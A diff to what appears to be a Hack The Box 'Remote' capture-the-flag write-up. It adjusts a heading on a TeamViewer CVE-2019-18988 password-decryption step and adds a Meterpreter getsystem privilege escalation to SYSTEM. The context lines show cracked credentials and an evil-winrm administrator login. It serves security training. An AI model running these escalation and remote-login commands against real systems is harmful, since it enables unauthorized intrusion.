@@ -710,7 +710,7 @@ remote\administrator
 | admin@htb.local | baconandcheese |
 | administrator | !R3m0te! |
 
-## CVE-2019-18988 - Metasploit - TeamViewer7 - decrypt password
+### CVE-2019-18988 - Metasploit - TeamViewer7 - decrypt password
 
 ```bash
 $ msfconsole -q                                
@@ -867,4 +867,20 @@ $ evil-winrm -i $TARGET -u administrator -p '!R3m0te!'
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 remote\administrator
+```
+
+### getsystem - Metasploit - Named Pipe Impersonation (PrintSpooler variant)
+
+```bash
+msf6 exploit(multi/script/web_delivery) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: IIS APPPOOL\DefaultAppPool
+
+meterpreter > getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
 ```
